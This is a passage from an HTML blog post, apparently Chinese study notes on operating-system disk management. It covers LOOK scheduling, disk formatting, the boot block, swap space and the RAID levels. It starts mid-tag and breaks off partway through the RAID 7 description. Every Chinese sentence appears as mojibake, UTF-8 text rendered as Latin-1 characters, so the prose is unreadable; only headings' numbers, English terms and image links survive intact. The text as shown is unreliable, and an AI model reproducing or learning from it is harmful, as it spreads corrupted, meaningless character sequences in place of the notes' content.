src="/posts/8ce3e425/image-20220108161725922.png" alt="image-20220108161725922"></p><h3 id="1245-lookè°ƒåº¦"><a class="markdownIt-Anchor" href="#1245-lookè°ƒåº¦"></a> 12.4.5 LOOKè°ƒåº¦</h3><p>é€šå¸¸ï¼Œç£å¤´åªç§»åŠ¨åˆ°ä¸€ä¸ªæ–¹å‘ä¸Šæœ€è¿œçš„è¯·æ±‚ä¸ºæ­¢ã€‚ æ¥ç€ï¼Œ å®ƒé©¬ä¸Šå›å¤´ï¼Œè€Œä¸æ˜¯ç»§ç»­åˆ°ç£ç›˜çš„å°½å¤´ã€‚è¿™ç§å½¢å¼çš„SCANå’ŒC-SCANç§°ä¸º<strong>LOOK</strong>å’Œ<strong>C-LOOKè°ƒåº¦</strong>ï¼Œ è¿™æ˜¯å› ä¸ºå®ƒä»¬åœ¨æœä¸€ä¸ªæ–¹å‘ç§»åŠ¨ä¼šçœ‹ï¼ˆlookï¼‰ æ˜¯å¦æœ‰è¯·æ±‚ï¼ˆè§å›¾12.8ï¼‰ã€‚</p><p><img src="/posts/8ce3e425/image-20220108161853784.png" alt="image-20220108161853784"></p><h3 id="1246-ç£ç›˜è°ƒåº¦ç®—æ³•çš„é€‰æ‹©"><a class="markdownIt-Anchor" href="#1246-ç£ç›˜è°ƒåº¦ç®—æ³•çš„é€‰æ‹©"></a> 12.4.6 ç£ç›˜è°ƒåº¦ç®—æ³•çš„é€‰æ‹©</h3><ul><li>SSTFè¾ƒä¸ºæ™®é€šä¸”å¾ˆæœ‰å¸å¼•åŠ›</li><li>SCANå’ŒC-SCANå¯¹ç£ç›˜è´Ÿè·è¾ƒå¤§çš„ç³»ç»Ÿä¼šæ‰§è¡Œå¾—æ›´å¥½ï¼Œè¿™æ˜¯å› ä¸ºå®ƒä¸å¯èƒ½äº§ç”Ÿé¥¥é¥¿é—®é¢˜ã€‚</li><li>å¯¹äºä»»ä½•è°ƒåº¦ç®—æ³•ï¼Œæ€§èƒ½ä¾èµ–äºè¯·æ±‚çš„ç±»å‹ä¸æ•°é‡</li><li>ç£ç›˜æœåŠ¡è¯·æ±‚å¾ˆå¤§ç¨‹åº¦ä¸Šå—æ–‡ä»¶åˆ†é…æ–¹æ³•æ‰€å½±å“ï¼ˆæ–‡ä»¶è¿ç»­åˆ†é…æ—¶ç£å¤´ç§»åŠ¨è·ç¦»ä¸€èˆ¬æ›´çŸ­ï¼‰</li><li>ç£ç›˜è°ƒåº¦ç®—æ³•åº”ä½œä¸ºä¸€ä¸ªæ“ä½œç³»ç»Ÿçš„ç‹¬ç«‹æ¨¡å—ï¼Œè¿™æ ·å¦‚æœæœ‰å¿…è¦ï¼Œå®ƒå¯ä»¥æ›¿æ¢æˆå¦ä¸€ä¸ªä¸åŒçš„ç®—æ³•ã€‚</li><li>SSTFæˆ–LOOKæ˜¯æ¯”è¾ƒåˆç†çš„ç¼ºçœç®—æ³•ã€‚</li></ul><h2 id="125-ç£ç›˜ç®¡ç†"><a class="markdownIt-Anchor" href="#125-ç£ç›˜ç®¡ç†"></a> 12.5 ç£ç›˜ç®¡ç†</h2><h3 id="1251-ç£ç›˜æ ¼å¼åŒ–"><a class="markdownIt-Anchor" href="#1251-ç£ç›˜æ ¼å¼åŒ–"></a> 12.5.1 ç£ç›˜æ ¼å¼åŒ–</h3><p><strong>ä½çº§æ ¼å¼åŒ–</strong> (æˆ–ç‰©ç†æ ¼å¼åŒ–)ï¼šåœ¨ç£ç›˜èƒ½å­˜å‚¨æ•°æ®ä¹‹å‰ï¼Œ å®ƒå¿…é¡»åˆ†æˆæ‰‡åŒºä»¥ä¾¿ç£ç›˜æ§åˆ¶å™¨èƒ½è¯»å’Œå†™ã€‚ ä½çº§æ ¼å¼åŒ–ä¸ºç£ç›˜çš„æ¯ä¸ªæ‰‡åŒºé‡‡ç”¨ç‰¹åˆ«çš„æ•°æ®ç»“æ„ã€‚</p><ul><li>æ¯ä¸ªæ‰‡åŒºçš„æ•°æ®ç»“æ„é€šå¸¸ç”±å¤´ã€æ•°æ®åŒºåŸŸï¼ˆé€šå¸¸ä¸º 512 B å¤§å°ï¼‰å’Œå°¾éƒ¨ ç»„æˆã€‚ å¤´éƒ¨å’Œå°¾éƒ¨åŒ…å«äº†ä¸€äº›ç£ç›˜æ§åˆ¶å™¨æ‰€ä½¿ç”¨çš„ä¿¡æ¯ï¼Œ å¦‚æ‰‡åŒºå·ç å’Œçº é”™ä»£ç ï¼ˆerror-correcting code, ECCï¼‰ã€‚</li></ul><p>ä¸ºäº†ä½¿ç”¨ç£ç›˜å­˜å‚¨æ–‡ä»¶ï¼Œ æ“ä½œç³»ç»Ÿè¿˜éœ€è¦å°†è‡ªå·±çš„æ•°æ®ç»“æ„è®°å½•åœ¨ç£ç›˜ä¸Šã€‚ è¿™åˆ†ä¸ºä¸¤æ­¥ã€‚</p><ul><li>ç¬¬ä¸€æ­¥æ˜¯å°†ç£ç›˜åˆ†ä¸ºç”±ä¸€ä¸ªæˆ–å¤šä¸ªæŸ±é¢ç»„æˆçš„åˆ†åŒºã€‚æ“ä½œç³»ç»Ÿå¯ä»¥å°†æ¯ä¸ªåˆ†åŒºä½œä¸ºä¸€ä¸ªç‹¬ç«‹çš„ç£ç›˜ã€‚ä¾‹å¦‚ï¼Œ ä¸€ä¸ªåˆ†åŒºå¯ä»¥ç”¨æ¥å­˜å‚¨æ“ä½œç³»ç»Ÿçš„å¯æ‰§è¡Œä»£ç ï¼Œ è€Œå…¶ä»–åˆ†åŒºç”¨æ¥å­˜å‚¨ç”¨æˆ·æ•°æ®ã€‚</li><li>åœ¨åˆ†åŒºä¹‹åï¼Œ ç¬¬äºŒæ­¥æ˜¯<strong>é€»è¾‘æ ¼å¼åŒ–</strong>ï¼ˆåˆ›å»ºæ–‡ä»¶ç³»ç»Ÿï¼‰ã€‚åœ¨è¿™ä¸€æ­¥ï¼Œæ“ä½œç³»ç»Ÿå°†åˆå§‹çš„æ–‡ä»¶ç³»ç»Ÿæ•°æ®ç»“æ„å­˜å‚¨åˆ°ç£ç›˜ä¸Šã€‚ è¿™äº›æ•°æ®ç»“æ„åŒ…æ‹¬ç©ºé—²å’Œå·±åˆ†é… çš„ç©ºé—´ï¼ˆFATæˆ–è€… inodeï¼‰å’Œä¸€ä¸ªåˆå§‹ä¸ºç©ºçš„ç›®å½•ã€‚</li></ul><p><img src="/posts/8ce3e425/image-20220108171332679.png" alt="image-20220108171332679"></p><h3 id="1252-å¼•å¯¼å—"><a class="markdownIt-Anchor" href="#1252-å¼•å¯¼å—"></a> 12.5.2 å¼•å¯¼å—</h3><p>åˆå§‹åŒ–è‡ªä¸¾ ç¨‹åºå¾ˆç®€å•ã€‚ å®ƒåˆå§‹åŒ–ç³»ç»Ÿçš„å„ä¸ªæ–¹é¢ï¼Œ ä»CPUå¯„å­˜å™¨åˆ°è®¾å¤‡æ§åˆ¶å™¨å’Œå†…å­˜ï¼Œ æ¥ç€å¯åŠ¨æ“ä½œç³»ç»Ÿ ã€‚ ä¸ºæ­¤ï¼Œ è‡ªä¸¾ç¨‹åºåº”æ‰¾åˆ°ç£ç›˜ä¸Šçš„æ“ä½œç³»ç»Ÿå†…æ ¸ï¼Œ è£…å…¥å†…å­˜ï¼Œ å¹¶è½¬åˆ°èµ·å§‹åœ°å€ï¼Œ ä»è€Œå¼€å§‹æ“ä½œç³»ç»Ÿçš„æ‰§è¡Œã€‚</p><p>ç»å¤§å¤šæ•°ç³»ç»Ÿåªåœ¨å¯åŠ¨ ROMä¸­ ä¿ç•™ä¸€ä¸ªå¾ˆå°çš„è‡ªä¸¾åŠ è½½ç¨‹åºï¼Œ å…¶ä½œç”¨æ˜¯è¿›ä¸€æ­¥ä»ç£ç›˜ä¸Šè°ƒå…¥ æ›´ä¸ºå®Œæ•´çš„è‡ªä¸¾ç¨‹åºã€‚ è¿™ä¸€ æ›´ä¸ºå®Œæ•´çš„è‡ªä¸¾ç¨‹åºå¯ä»¥å®¹æ˜“åœ°è¿›è¡Œä¿®æ”¹ï¼šæ–°ç‰ˆæœ¬å¯å†™åˆ°ç£ç›˜ä¸Šã€‚ è¿™ä¸ªå®Œæ•´çš„è‡ªä¸¾ç¨‹åºä¿å­˜åœ¨ç£ç›˜çš„å¯åŠ¨å— ä¸Šï¼Œ å¯åŠ¨å—ä½äºç£ç›˜çš„å›ºå®šä½ç½® ã€‚æ‹¥æœ‰å¯åŠ¨åˆ†åŒºçš„ç£ç›˜ç§°ä¸ºå¯åŠ¨ç£ç›˜ï¼ˆboot diskï¼‰ï¼Œæˆ–ç³»ç»Ÿç£ç›˜ï¼ˆsystemdiskï¼‰ã€‚</p><h3 id="1253-åå—"><a class="markdownIt-Anchor" href="#1253-åå—"></a> 12.5.3 åå—</h3><h2 id="126-äº¤æ¢ç©ºé—´ç®¡ç†"><a class="markdownIt-Anchor" href="#126-äº¤æ¢ç©ºé—´ç®¡ç†"></a> 12.6 äº¤æ¢ç©ºé—´ç®¡ç†</h2><h3 id="1261-äº¤æ¢ç©ºé—´çš„ä½¿ç”¨"><a class="markdownIt-Anchor" href="#1261-äº¤æ¢ç©ºé—´çš„ä½¿ç”¨"></a> 12.6.1 äº¤æ¢ç©ºé—´çš„ä½¿ç”¨</h3><p>å®ç°äº¤æ¢çš„ç³»ç»Ÿå¯ä»¥å°†äº¤æ¢ç©ºé—´ç”¨äºä¿å­˜æ•´ä¸ªè¿›ç¨‹æ˜ åƒï¼Œ åŒ…æ‹¬ä»£ç æ®µå’Œæ•°æ®æ®µã€‚</p><p>æ¢é¡µç³»ç»Ÿä¹Ÿå¯èƒ½åªç”¨äº¤æ¢ç©ºé—´ä»¥å­˜å‚¨æ¢å‡ºå†…å­˜çš„é¡µã€‚</p><p>ç³»ç»Ÿæ‰€éœ€äº¤æ¢ç©ºé—´çš„é‡å› æ­¤ä¼šå—ä»¥ä¸‹å› ç´ å½±å“ï¼šç‰©ç†å†…å­˜çš„å¤šå°‘ã€ æ‰€æ”¯æŒè™šæ‹Ÿå†…å­˜çš„å¤šå°‘ã€ å†…å­˜ä½¿ç”¨æ–¹å¼ç­‰ã€‚ å®ƒå¯ä»¥æ˜¯æ•°MBåˆ°æ•°GBçš„ç£ç›˜ç©ºé—´ã€‚</p><h3 id="1262-äº¤æ¢ç©ºé—´ä½ç½®"><a class="markdownIt-Anchor" href="#1262-äº¤æ¢ç©ºé—´ä½ç½®"></a> 12.6.2 äº¤æ¢ç©ºé—´ä½ç½®</h3><p>äº¤æ¢ç©ºé—´å¯æœ‰ä¸¤ä¸ªä½ç½®ï¼š äº¤æ¢ç©ºé—´åœ¨æ™®é€šæ–‡ä»¶ç³»ç»Ÿä¸ŠåŠ ä»¥åˆ›å»º**ï¼ˆå¤–éƒ¨ç¢ç‰‡ï¼‰<strong>ï¼Œ æˆ–è€…æ˜¯åœ¨ä¸€ä¸ªç‹¬ç«‹çš„ç£ç›˜åˆ†åŒºä¸Šè¿›è¡Œ</strong>ï¼ˆå†…éƒ¨ç¢ç‰‡ï¼‰**ã€‚</p><h3 id="1263-å®ä¾‹äº¤æ¢ç©ºé—´ç®¡ç†"><a class="markdownIt-Anchor" href="#1263-å®ä¾‹äº¤æ¢ç©ºé—´ç®¡ç†"></a> 12.6.3 å®ä¾‹ï¼šäº¤æ¢ç©ºé—´ç®¡ç†</h3><ul><li>4.3 BSDåœ¨è¿›ç¨‹å¯åŠ¨çš„æ—¶å€™åˆ†é…äº¤æ¢ç©ºé—´ï¼Œç”¨æ¥ä¿å­˜æ–‡æœ¬æ®µï¼ˆä»£ç æ®µï¼‰å’Œæ•°æ®æ®µå†…æ ¸ä½¿ç”¨äº¤æ¢æ˜ å°„æ¥è·Ÿè¸ªäº¤æ¢ç©ºé—´çš„ä½¿ç”¨</li><li>Solaris 2å½“é¡µè¢«å¼ºåˆ¶æ¢å‡ºå†…å­˜çš„æ—¶å€™åˆ†é…äº¤æ¢ç©ºé—´ã€‚</li></ul><h2 id="127-raidç»“æ„"><a class="markdownIt-Anchor" href="#127-raidç»“æ„"></a> 12.7 RAIDç»“æ„</h2><p>å¤šç§ç£ç›˜ç»„ç»‡æŠ€æœ¯ï¼Œ é€šå¸¸ç»Ÿç§°ä¸º**ç£ç›˜å†—ä½™é˜µåˆ—ï¼ˆRAIDï¼‰**æŠ€æœ¯ï¼Œ é€šå¸¸ç”¨äºæé«˜æ€§èƒ½å’Œå¯é æ€§ã€‚</p><h3 id="1271-é€šè¿‡å†—ä½™æ”¹å–„å¯é æ€§"><a class="markdownIt-Anchor" href="#1271-é€šè¿‡å†—ä½™æ”¹å–„å¯é æ€§"></a> 12.7.1 é€šè¿‡å†—ä½™æ”¹å–„å¯é æ€§</h3><ul><li><p>å¦‚æœåªå­˜å‚¨æ•°æ®çš„ä¸€ä¸ªæ‹·è´ï¼Œåªè¦nä¸ªç£ç›˜ä¸­çš„ä¸€ä¸ªç£ç›˜å‡ºé”™ï¼Œæ•°æ®å°±å‡ºç°é”™è¯¯ã€‚å› æ­¤nä¸ªç£ç›˜çš„å‡ºé”™ç‡å¤§äº1ä¸ªç£ç›˜çš„å‡ºé”™ç‡ã€‚</p></li><li><p>å¯é æ€§é—®é¢˜çš„è§£å†³æ–¹æ³•æ˜¯å¼•å…¥å†—ä½™ã€‚</p><ul><li>æœ€ä¸ºç®€å•ï¼ˆä½†æœ€ä¸ºæ˜‚è´µï¼‰ çš„å¼•å…¥å†—ä½™çš„æ–¹æ³•æ˜¯å¤åˆ¶æ¯ä¸ªç£ç›˜ã€‚ è¿™ç§æŠ€æœ¯ç§°ä¸ºé•œåƒ(mirroringï¼‰ã€‚ å› æ­¤æ¯ä¸ªé€»è¾‘ç£ç›˜ç”±ä¸¤ä¸ªç‰©ç†ç£ç›˜ç»„æˆï¼Œ æ¯æ¬¡å†™éƒ½è¦åœ¨ä¸¤ä¸ªç£ç›˜ä¸Šè¿›è¡Œã€‚ å¦‚æœä¸€ä¸ªç£ç›˜æŸåï¼Œ é‚£ä¹ˆå¯ä»å¦ä¸€ç£ç›˜ä¸­æ¢å¤ã€‚ åªæœ‰åœ¨ç¬¬ä¸€ä¸ªæŸåç£ç›˜æ²¡æœ‰æ›¿æ¢ä¹‹å‰è€Œç¬¬äºŒä¸ªç£ç›˜åˆå‡ºé”™ï¼Œ é‚£ä¹ˆæ•°æ®æ‰ä¼šä¸¢å¤±ã€‚</li></ul></li></ul><h3 id="1272-é€šè¿‡å¹¶è¡Œå¤„ç†æ”¹å–„æ€§èƒ½"><a class="markdownIt-Anchor" href="#1272-é€šè¿‡å¹¶è¡Œå¤„ç†æ”¹å–„æ€§èƒ½"></a> 12.7.2 é€šè¿‡å¹¶è¡Œå¤„ç†æ”¹å–„æ€§èƒ½</h3><p>å¯¹äºå¤šä¸ªç£ç›˜ï¼Œ é€šè¿‡åœ¨å¤šä¸ªç£ç›˜ä¸Šåˆ†æ•£æ•°æ®ï¼Œ å¯ä»¥æ”¹å–„ä¼ è¾“ç‡ã€‚æœ€ç®€å•å½¢å¼æ˜¯ï¼Œ æ•°æ®åˆ†æ•£æ˜¯åœ¨å¤šä¸ªç£ç›˜ä¸Šåˆ†æ•£æ¯ä¸ªå­—èŠ‚çš„å„ä¸ªä½ï¼Œ è¿™ç§åˆ†æ•£ç§°ä¸ºä½çº§åˆ†æ•£ã€‚</p><p>æ€»ä¹‹ï¼Œ ç£ç›˜ç³»ç»Ÿå¹¶è¡Œè®¿é—®æœ‰ä¸¤ä¸ªä¸»è¦ç›®çš„ï¼š</p><ul><li>â‘ é€šè¿‡è´Ÿè·å¹³è¡¡ï¼Œ å¢åŠ äº†å¤šä¸ªå°è®¿é—®ï¼ˆå³é¡µè®¿é—®ï¼‰çš„ååé‡ã€‚</li><li>â‘¡é™ä½å¤§è®¿é—®çš„å“åº”æ—¶é—´</li></ul><h3 id="1273-raidçº§åˆ«"><a class="markdownIt-Anchor" href="#1273-raidçº§åˆ«"></a> 12.7.3 RAIDçº§åˆ«</h3><p>é€šè¿‡ç£ç›˜åˆ†æ•£å’Œ â€œ å¥‡å¶ â€ ä½ï¼ˆä¸‹é¢å°†è¦è®¨è®ºï¼‰å¯ä»¥æä¾›å¤šç§æ–¹æ¡ˆä»¥åœ¨ä½ä»£ä»·ç¯å¢ƒä¸‹æä¾›å†—ä½™ã€‚ è¿™<br>äº›æ–¹æ¡ˆæœ‰ä¸åŒçš„æ€§ä»·æŠ˜ä¸­ï¼Œå¯åˆ†æˆä¸åŒçº§åˆ«ï¼Œç§°ä¸º<strong>RAIDçº§åˆ«</strong>ã€‚</p><p><img src="/posts/8ce3e425/image-20220108200057196.png" alt="image-20220108200057196"></p><ul><li><p><strong>RAIDçº§åˆ«0</strong>ï¼š</p><ul><li>æ•°æ®åˆ†å—ï¼Œå³æŠŠæ•°æ®åˆ†å¸ƒåœ¨å¤šä¸ªç›˜ä¸Šï¼Œå†™æ€§èƒ½å¥½ã€‚</li><li>éå†—ä½™é˜µåˆ—ã€æ— å†—ä½™ä¿¡æ¯ã€‚</li><li>ä¸¥æ ¼åœ°è¯´ï¼Œå®ƒä¸å±äºRAIDç³»åˆ—ã€‚</li></ul><p><img src="/posts/8ce3e425/image-20220108200332672.png" alt="image-20220108200332672"></p></li><li><p><strong>RAIDçº§åˆ«1:</strong></p><ul><li>RAIDçº§åˆ«1æŒ‡ç£ç›˜é•œåƒã€‚</li><li>æ¯å½“æ•°æ®å†™å…¥ä¸€ä¸ªç£ç›˜æ—¶ï¼Œå°†è¯¥æ•°æ®ä¹Ÿå†™åˆ°å¦ä¸€ä¸ªå†—ä½™ç›˜ï¼Œå½¢æˆä¿¡æ¯çš„ä¸¤ä»½å¤åˆ¶å“ã€‚</li></ul><p><img src="/posts/8ce3e425/image-20220108200532205.png" alt="image-20220108200532205"></p><ul><li><strong>RAID1ç‰¹ç‚¹ï¼š</strong><ul><li>è¯»æ€§èƒ½å¥½ã€‚</li><li>å¯é æ€§å¾ˆé«˜ã€‚</li><li>æœ€æ˜‚è´µçš„è§£å†³æ–¹æ³•ï¼Œç‰©ç†ç£ç›˜ç©ºé—´æ˜¯é€»è¾‘ç£ç›˜ç©ºé—´çš„ä¸¤å€ã€‚</li></ul></li></ul></li><li><p><strong>RAID0+1</strong></p><ul><li><strong>å…ˆåˆ†å—åé•œåƒ</strong></li><li>å…ˆåšä¸¤ä¸ªRAID0ï¼Œç„¶åå†åšRAID1ï¼Œå› æ­¤RAID0+1å…è®¸åå¤šä¸ªç›˜ï¼Œä½†åªèƒ½åœ¨ååœ¨åŒä¸€ä¸ªRAID0ä¸­ï¼Œä¸å…è®¸ä¸¤ä¸ªRAID0éƒ½æœ‰åç›˜</li></ul><p><img src="/posts/8ce3e425/image-20220108203505969.png" alt="image-20220108203505969"></p></li><li><p><strong>RAID1+0</strong></p><ul><li><strong>å…ˆé•œåƒååˆ†å—</strong></li><li>å…ˆåšRAID1ï¼Œç„¶åå†åšRAID0ï¼Œå› æ­¤RAID1+0å…è®¸åå¤šä¸ªç›˜ï¼Œåªè¦ä¸æ˜¯ä¸€å¯¹ç£ç›˜åå°±å¯ä»¥ã€‚</li></ul><p><img src="/posts/8ce3e425/image-20220108203604834.png" alt="image-20220108203604834"></p></li><li><p><strong>Raid0+1å’ŒRaid1+0æ¯”è¾ƒ</strong></p><p>åœ¨RAID 1+0çš„æƒ…å†µä¸‹ï¼Œå½“ä¸€å—ç‹¬ç«‹çš„ç‰©ç†ç£ç›˜æ•…éšœåï¼Œç”±äºæœ‰ä¸€å—å¯¹åº”é•œåƒç£ç›˜ä¿æŠ¤æ•°æ®ï¼ˆé™¤éå¯¹åº”çš„ç‰¹å®šé•œåƒç¡¬ç›˜ä¹ŸåŒæ—¶å‘ç”Ÿæ•…éšœï¼‰ï¼Œå› æ­¤ä¸ä¼šå¯¹æ€§èƒ½å¸¦æ¥å½±å“ï¼Œä»è€Œæ˜¾è‘—é«˜äºRAID 0+1çš„å®¹é”™æ€§ã€‚ç£ç›˜æ•…éšœåçš„æ¢å¤æˆæœ¬RAID 1+0æŠ€æœ¯ä¹Ÿè¿œä½äºRAID 0+1ã€‚åœ¨RAID 1+0æŠ€æœ¯ä¸­åªéœ€è¦é‡å»ºä¸€å—ç‰©ç†ç£ç›˜ï¼Œè€ŒRAID 0+1æŠ€æœ¯å¿…é¡»é‡å»ºç”±å—ä¸­æ‰€æœ‰ç‰©ç†ç£ç›˜ç»„æˆçš„è™šæ‹Ÿç£ç›˜ï¼Œä»è¿™ç‚¹ä¹Ÿèƒ½å¤Ÿä½“ç°å‡ºRAID 1+0ç›¸å¯¹RAID 0+1çš„ä¼˜åŠ¿ã€‚</p></li><li><p><strong>RAIDçº§åˆ«2:</strong></p><p><img src="/posts/8ce3e425/image-20220108201500262.png" alt="image-20220108201500262"></p><ul><li><strong>RAID2ç‰¹ç‚¹ï¼š</strong><ul><li>RAIDçº§åˆ«2ä¹Ÿç§°ä¸ºå†…å­˜æ–¹å¼çš„å·®é”™çº æ­£ä»£ç ç»“æ„ã€‚</li><li>å¹¶è¡Œå­˜å–ï¼Œå„ä¸ªé©±åŠ¨å™¨åŒæ­¥å·¥ä½œã€‚</li><li>ä½¿ç”¨æµ·æ˜ç¼–ç æ¥è¿›è¡Œé”™è¯¯æ£€æµ‹å’Œçº æ­£ï¼Œæ•°æ®ä¼ è¾“ç‡é«˜ã€‚</li><li>éœ€è¦å¤šä¸ªç£ç›˜æ¥å­˜æ”¾æµ·æ˜æ ¡éªŒç ä¿¡æ¯ï¼Œå†—ä½™ç£ç›˜æ•°é‡ä¸æ•°æ®ç£ç›˜æ•°é‡çš„å¯¹æ•°æˆæ­£æ¯”ã€‚</li><li>æ˜¯ä¸€ç§åœ¨å¤šç£ç›˜æ˜“å‡ºé”™ç¯å¢ƒä¸­çš„æœ‰æ•ˆé€‰æ‹©ã€‚</li><li>å¹¶æœªè¢«å¹¿æ³›åº”ç”¨ï¼Œç›®å‰è¿˜æ²¡æœ‰å•†ä¸šåŒ–äº§å“</li></ul></li></ul></li><li><p><strong>RAIDçº§åˆ«3:</strong></p><ul><li>Rä½äº¤å‰å¥‡å¶æ ¡éªŒç›˜é˜µåˆ—ã€‚</li><li>å•ç›˜å®¹é”™å¹¶è¡Œä¼ è¾“ï¼šæ•°æ®ä»¥ä½æˆ–å­—èŠ‚äº¤å‰å­˜å‚¨ï¼Œå¥‡å¶æ ¡éªŒä¿¡æ¯å­˜å‚¨åœ¨ä¸€å°ä¸“ç”¨ç›˜ä¸Šã€‚</li></ul><p><img src="/posts/8ce3e425/image-20220108201934015.png" alt="image-20220108201934015"></p><ul><li><p>RAID3è¯»å†™ç‰¹ç‚¹ï¼š</p><ul><li>å‡å®šæœ‰4ä¸ªæ•°æ®ç›˜å’Œä¸€ä¸ªå†—ä½™ç›˜ã€‚</li><li>è¯»å‡ºæ•°æ®ï¼Œä¸€å…±éœ€è¦5æ¬¡ç£ç›˜è¯»æ“ä½œã€‚</li><li>å†™æ•°æ®éœ€è¦3æ¬¡ç£ç›˜è¯»å’Œ2æ¬¡ç£ç›˜å†™æ“ä½œã€‚</li></ul><p><img src="/posts/8ce3e425/image-20220108202309032.png" alt="image-20220108202309032"></p></li><li><p><strong>RAID3ç‰¹ç‚¹ï¼š</strong></p><ul><li>å°†ç£ç›˜åˆ†ç»„ï¼Œè¯»å†™è¦è®¿é—®ç»„ä¸­æ‰€æœ‰ç›˜ï¼Œæ¯ç»„ä¸­æœ‰ä¸€ä¸ªç›˜ä½œä¸ºæ ¡éªŒç›˜ã€‚</li><li>æ ¡éªŒç›˜ä¸€èˆ¬é‡‡ç”¨å¥‡å¶æ ¡éªŒã€‚</li><li>ç®€å•ç†è§£ï¼šå…ˆå°†åˆ†å¸ƒåœ¨å„ä¸ªæ•°æ®ç›˜ä¸Šçš„ä¸€ç»„æ•°æ®åŠ èµ·æ¥ï¼Œå°†å’Œå­˜æ”¾åœ¨å†—ä½™ç›˜ä¸Šã€‚ä¸€æ—¦æŸä¸€ä¸ªç›˜å‡ºé”™ï¼Œåªè¦å°†å†—ä½™ç›˜ä¸Šçš„å’Œå‡å»æ‰€æœ‰æ­£ç¡®ç›˜ä¸Šçš„æ•°æ®ï¼Œå¾—åˆ°çš„å·®å°±æ˜¯å‡ºé”™çš„ç›˜ä¸Šçš„æ•°æ®ã€‚</li><li>ç¼ºç‚¹ï¼šæ¢å¤æ—¶é—´è¾ƒé•¿ã€‚</li></ul></li></ul></li><li><p><strong>RAIDçº§åˆ«4:</strong></p><ul><li>ä¸“ç”¨å¥‡å¶æ ¡éªŒç‹¬ç«‹å­˜å–ç›˜é˜µåˆ—ã€‚</li><li>æ•°æ®ä»¥å—ï¼ˆå—å¤§å°å¯å˜ï¼‰äº¤å‰çš„æ–¹å¼å­˜äºå„ç›˜ï¼Œå¥‡å¶æ ¡éªŒä¿¡æ¯å­˜åœ¨ä¸€å°ä¸“ç”¨ç›˜ä¸Šã€‚</li></ul><p><img src="/posts/8ce3e425/image-20220108202537741.png" alt="image-20220108202537741"></p><ul><li><strong>RAID4ç‰¹ç‚¹ï¼š</strong><ul><li>å†—ä½™ä»£ä»·ä¸RAID3ç›¸åŒã€‚</li><li>è®¿é—®æ•°æ®çš„æ–¹æ³•ä¸RAID3ä¸åŒã€‚<ul><li>RAID4å¯¹æ•°æ®çš„è®¿é—®æ˜¯æŒ‰æ•°æ®å—ï¼ˆä¸€èˆ¬æ˜¯ä¸€ä¸ªæ‰‡åŒºï¼‰è¿›è¡Œçš„ï¼Œä¹Ÿå°±æ˜¯æŒ‰ç£ç›˜è¿›è¡Œçš„ï¼Œæ¯æ¬¡æ˜¯ä¸€ä¸ªç›˜ã€‚ RAID3æ˜¯ä¸€æ¬¡ä¸€æ¨ªæ¡ï¼Œè€ŒRAID4ä¸€æ¬¡ä¸€ç«–æ¡ã€‚æ‰€ä»¥RAID3å¸¸é¡»è®¿é—®é˜µåˆ—ä¸­æ‰€æœ‰çš„ç¡¬ç›˜é©±åŠ¨å™¨ï¼Œè€ŒRAID4åªé¡»è®¿é—®æœ‰ç”¨çš„ç¡¬ç›˜é©±åŠ¨å™¨ã€‚</li><li>è¿™æ ·è¯»æ•°æ®çš„é€Ÿåº¦å¤§å¤§æé«˜äº†ï¼Œä½†åœ¨å†™æ•°æ®æ–¹é¢ï¼Œéœ€å°†ä»æ•°æ®ç¡¬ç›˜é©±åŠ¨å™¨å’Œæ ¡éªŒç¡¬ç›˜é©±åŠ¨å™¨ä¸­æ¢å¤å‡ºçš„æ—§æ•°æ®ä¸æ–°æ•°æ®é€šè¿‡å¼‚æˆ–è¿ç®—ï¼Œç„¶åå†å°†æ›´æ–°åçš„æ•°æ®å’Œæ£€éªŒä½å†™å…¥ç¡¬ç›˜é©±åŠ¨å™¨ã€‚</li></ul></li></ul></li></ul></li><li><p><strong>RAIDçº§åˆ«5</strong></p><ul><li>å—äº¤å‰åˆ†å¸ƒå¼å¥‡å¶æ ¡éªŒç›˜é˜µåˆ—ã€‚</li><li>æ•°æ®ä»¥å—äº¤å‰çš„æ–¹å¼å­˜äºå„ç›˜ï¼Œæ— ä¸“ç”¨å†—ä½™ç›˜ï¼Œå¥‡å¶æ ¡éªŒä¿¡æ¯å‡åŒ€åˆ†å¸ƒåœ¨æ‰€æœ‰ç£ç›˜ä¸Šã€‚</li></ul><p><img src="/posts/8ce3e425/image-20220108202759467.png" alt="image-20220108202759467"></p><ul><li><strong>RAID5ç‰¹ç‚¹ï¼š</strong><ul><li><strong>RAID5</strong>çš„è¯»å‡ºæ•ˆç‡å¾ˆé«˜ï¼Œå†™å…¥æ•ˆç‡ä¸€èˆ¬ï¼Œå—å¼çš„é›†ä½“è®¿é—®æ•ˆç‡ä¸é”™ã€‚å› ä¸ºå¥‡å¶æ ¡éªŒç åœ¨ä¸åŒçš„ç£ç›˜ä¸Šï¼Œæ‰€ä»¥æé«˜äº†å¯é æ€§ï¼Œå…è®¸å•ä¸ªç£ç›˜å‡ºé”™ã€‚</li></ul></li></ul><p><img src="/posts/8ce3e425/image-20220108202836430.png" alt="image-20220108202836430"></p></li><li><p><strong>RAIDçº§åˆ«6ï¼š</strong></p><ul><li>åŒç»´å¥‡å¶æ ¡éªŒç‹¬ç«‹å­˜å–ç›˜é˜µåˆ—ã€‚</li></ul><p><img src="/posts/8ce3e425/image-20220108203118196.png" alt="image-20220108203118196"></p><ul><li><strong>RAID6ç‰¹ç‚¹ï¼š</strong><ul><li>å¯å®¹å¿åŒç›˜å‡ºé”™ã€‚</li><li>RAID5çš„æ‰©å±•ï¼Œä¸»è¦æ˜¯ç”¨äºè¦æ±‚æ•°æ®ç»å¯¹ä¸èƒ½å‡ºé”™çš„åœºåˆã€‚ç”±äºå¼•å…¥äº†ç¬¬äºŒç§å¥‡å¶æ ¡éªŒå€¼ï¼Œæ‰€ä»¥éœ€è¦N+2ä¸ªç£ç›˜ï¼ŒåŒæ—¶å¯¹æ§åˆ¶å™¨çš„è®¾è®¡å˜å¾—ååˆ†å¤æ‚ï¼Œå†™å…¥é€Ÿåº¦ä¹Ÿä¸å¥½ï¼Œç”¨äºè®¡ç®—å¥‡å¶æ ¡éªŒå€¼å’ŒéªŒè¯æ•°æ®æ­£ç¡®æ€§æ‰€èŠ±è´¹çš„æ—¶é—´æ¯”è¾ƒå¤šï¼Œé€ æˆäº†ä¸å¿…é¡»çš„è´Ÿè½½</li></ul></li></ul></li><li><p><strong>RAIDçº§åˆ«7ï¼š</strong></p><ul><li>RAID7æ˜¯åœ¨RAID6çš„åŸºç¡€ä¸Šï¼Œé‡‡ç”¨äº†cacheæŠ€æœ¯ï¼Œå®ƒä½¿å¾—ä¼ 